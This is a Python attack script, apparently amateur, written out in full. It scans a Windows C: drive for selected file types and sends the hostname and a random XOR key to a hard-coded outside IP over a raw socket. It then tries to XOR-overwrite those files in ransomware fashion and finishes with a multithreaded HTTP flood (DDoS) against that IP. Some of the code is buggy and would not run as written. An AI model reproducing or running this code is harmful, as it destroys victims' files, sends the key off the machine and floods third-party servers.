#port 3389, 80

import os
import time
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
import sys
import threading
import random
import re


#time = datetime.now()

def wait(amount):
  time.sleep(amount)

#sleep
#time.sleep(1800)
#print('approx 36.6 mins until attack{}...')
#time.sleep(2200)
#password to make it work
safegaurd = input('please enter "start" to begin: ')
# safegaurd password
if safegaurd != 'start':
    quit()


#start attack
os.system('clear')
print('')
print('[#] starting attack{}...')
time.sleep(8)


#type of files that are going to be attacked
encrypt_ext = (".zip",".txt","bin",".local",".exe",".com",".js" )
#file paths
file_paths = []

for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root + '\\' + file)
        if file_ext in encrypt_ext:
            file_paths.append(root + '\\' + file)

key = ''

encryption_level = 128 // 8
char_pool = ''

for i in range(0x00, 0xff):
    char_pool += (chr(i))
    #print(char_pool)

for i in range(encryption_level):
    key += random.choice(char_pool)
print('')
print('the key is shown below: ')
print('')
print(key)

hostname = os.getenv('COMPUTERNAME')
print('')
print('hostname shown below: ')
print('')
print(hostname)
print('')
#connect to device you want to attack
ip_adress = '151.101.206.214'
#port number
port = 80
# ip Connection
print('[#] testing connection to server, IP = ', (ip_adress))
time.sleep(8)
#set date time

#connect
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_adress, port))
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))
print('[#] secure connection')
time.sleep(5)
print('[#] connected')
print('')
time.sleep(3)
print('')
print('NOTE:the file encryption may take a while, feel free to browse on other sites/pages if this takes too long!')
print('')
print('NOTE: only works on computers with files and or computers only')
print('')
print('[#] encrypting files{}...')
#print('loading world{}...')
time.sleep(5)
#time = time.time()

#Encrypt files
q = Queue()

def encrypt(key):
  while q.not_empty:
    file = q.get()
    index = 0
    max_index = encryption_level - 1
    try:
      with open(file, 'rb') as f:
        data = f.read()
        print(data)
        with open(file, 'wb') as f:
          for byte in data:
            xor_byte = byte ^ ord(key[index])
            f.write(xor_byte.to_bytes(1, 'little'))
            print(xor_byte)
            if index >= max_index:
              index = 0
            else:
              index += 1

    except:
      print(f'failed to encrypt {file}')
      q.task_done()

for file in file_paths:
    q.put(files)
    print(files)
for i in range(30):
    thread = Thread(target=encrypt, args=(key, ), daemon=True)
#class Hero: 
  #def __init__(self):
    #self.Thread = Thread
#Hero(self)
q.join()
#print('[#] encryption complete!')
time.sleep(3)
#print('[#] closing connection')
time.sleep(4)
print('')
print('[#] Reopening connection to ' + str(ip_adress) + '{}...')
time.sleep(4)
print('')
##################################################
#STARTING DDOS ATTACK

print('[#] STARTING DDOS ATTACK on ' + str(ip_adress) + '{}...')
print('')
#print('NOTE: this part only works in a "LINUX" environment/workspace! ')
import random
import socket
import string
import sys
import threading
import time
time.sleep(10)
# Parse inputs
host = "main.py"
#twitch API-
ip = "151.101.206.214"
print('[#]connected to ' + str(ip))
time.sleep(3)
#ip = '99.181.101.248'
port = 80
num_requests = 10000000000000000000000000

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    #sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[0]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    #sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    #time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
